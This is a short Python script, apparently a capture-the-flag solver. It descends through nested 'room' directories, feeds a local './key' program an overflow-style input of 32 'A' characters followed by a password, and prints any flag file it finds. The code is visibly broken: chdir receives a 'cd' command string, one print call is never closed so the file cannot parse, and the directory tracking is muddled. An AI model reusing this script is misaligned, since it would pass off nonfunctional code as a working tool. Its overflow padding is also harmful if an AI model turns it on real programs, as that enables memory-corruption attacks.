#!/usr/bin/env python3
from os import *
from time import sleep
from subprocess import Popen,PIPE

count = 0
pwd = ""
room = ["room0","room1"]

def brute(pwd):
    global count
    for i in room:
        count += 1
        print(count)
        chdir("cd {}".format(pwd+i))
        pwd = ""
        if check_dir():
            check_flag()
            pwd = "../"
            continue
        io = Popen('./key', stdin=PIPE, stdout=PIPE)
        io.communicate(("A"*32+"p4ssw0rd").encode())
        check_flag()
        brute(pwd)
        popen("exit")
        pwd = "../"

def check_dir():
    ls = popen("ls").read()
    if "room" not in ls:
        return True
    else:
        return False


def check_flag():
    ls = popen("ls").read()
    if "flag" in ls:
        print(popen("cat flag*").read() 
        exit()
        
brute(pwd)